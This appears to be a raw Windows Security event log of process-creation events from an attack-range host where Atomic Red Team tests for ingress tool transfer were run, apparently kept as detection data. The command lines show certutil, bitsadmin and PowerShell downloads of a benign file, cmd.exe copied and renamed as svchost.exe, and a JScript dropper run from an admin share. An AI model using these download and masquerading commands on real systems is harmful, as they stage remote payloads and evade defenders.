+02/16/2022 08:57:49 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742632
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x638
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "copy C:\Windows\System32\cmd.exe C:\svchost.exe & C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:49 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742526
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xa70
+	New Process Name:	C:\Windows\System32\cscript.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x10c8
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	CScript.exe  AtomicTestT1105.js //E:JScript 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:48 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742495
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x10c8
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "pushd \\localhost\C$ & echo var fileObject = WScript.createobject("Scripting.FileSystemObject");var newfile = fileObject.CreateTextFile("AtomicTestFileT1105.js", true);newfile.WriteLine("This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives.");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:48 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52742179
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1e6c
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object System.Net.WebClient).DownloadFile(\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"", \""$env:TEMP\Atomic-license.txt\"")} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:46 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52741519
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1408
+	New Process Name:	C:\Windows\System32\bitsadmin.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xd90
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	C:\Windows\System32\bitsadmin.exe  /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\ADMINI~1\AppData\Local\Temp\2\Atomic-license.txt 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:46 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52741513
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xd90
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt %temp%\Atomic-license.txt" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:45 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52741440
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1a30
+	New Process Name:	C:\Windows\System32\certutil.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1104
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\certutil.exe" -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:44 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52741040
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1104
+	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {$datePath = \""certutil-$(Get-Date -format yyyy_MM_dd)\""
+New-Item -Path $datePath -ItemType Directory
+Set-Location $datePath
+certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+Get-ChildItem | Where-Object {$_.Name -notlike \""*.txt\""} | Foreach-Object { Move-Item $_.Name -Destination Atomic-license.txt }} 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:43 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52740894
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xba4
+	New Process Name:	C:\Windows\System32\certutil.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x13a0
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	certutil  -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"  
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:43 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52740893
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x13a0
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0xc2c
+	Creator Process Name:	C:\Windows\System32\cmd.exe
+	Process Command Line:	"cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt"  
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:43 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52740878
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xc2c
+	New Process Name:	C:\Windows\System32\cmd.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\cmd.exe" /c "cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt Atomic-license.txt" 
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:43 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52740761
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x1e84
+	New Process Name:	C:\Windows\System32\whoami.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\whoami.exe"
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:43 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52740750
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0xef4
+	New Process Name:	C:\Windows\System32\HOSTNAME.EXE
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x1138
+	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+	Process Command Line:	"C:\Windows\system32\HOSTNAME.EXE"
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:38 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52739318
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x834
+	New Process Name:	C:\Windows\System32\dllhost.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x2c8
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	C:\Windows\system32\DllHost.exe /Processid:{133EAC4F-5891-4D04-BADA-D84870380A80}
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:38 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52739304
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		NULL SID
+	Account Name:		-
+	Account Domain:		-
+	Logon ID:		0x0
+
+Process Information:
+	New Process ID:		0x82c
+	New Process Name:	C:\Windows\System32\taskhostw.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\System Mandatory Level
+	Creator Process ID:	0x408
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	taskhostw.exe
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:37 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52739263
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Process Information:
+	New Process ID:		0x1ce0
+	New Process Name:	C:\Windows\System32\AtBroker.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x964
+	Creator Process Name:	C:\Windows\System32\winlogon.exe
+	Process Command Line:	atbroker.exe
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:37 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52739234
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\NETWORK SERVICE
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E4
+
+Target Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Process Information:
+	New Process ID:		0x11e0
+	New Process Name:	C:\Windows\System32\rdpclip.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x3a0
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	rdpclip
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
+Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.
+
+Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
+02/16/2022 08:57:37 PM
+LogName=Security
+SourceName=Microsoft Windows security auditing.
+EventCode=4688
+EventType=0
+Type=Information
+ComputerName=win-host-mhaag-attack-range-791
+TaskCategory=Process Creation
+OpCode=Info
+RecordNumber=52739162
+Keywords=Audit Success
+Message=A new process has been created.
+
+Creator Subject:
+	Security ID:		NT AUTHORITY\SYSTEM
+	Account Name:		WIN-HOST-MHAAG-$
+	Account Domain:		WORKGROUP
+	Logon ID:		0x3E7
+
+Target Subject:
+	Security ID:		WIN-HOST-MHAAG-\Administrator
+	Account Name:		Administrator
+	Account Domain:		WIN-HOST-MHAAG-
+	Logon ID:		0xB50CB
+
+Process Information:
+	New Process ID:		0x8c8
+	New Process Name:	C:\Windows\System32\TSTheme.exe
+	Token Elevation Type:	%%1936
+	Mandatory Label:		Mandatory Label\High Mandatory Level
+	Creator Process ID:	0x2c8
+	Creator Process Name:	C:\Windows\System32\svchost.exe
+	Process Command Line:	C:\Windows\system32\TSTheme.exe -Embedding
+
+Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
+
+Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.
+
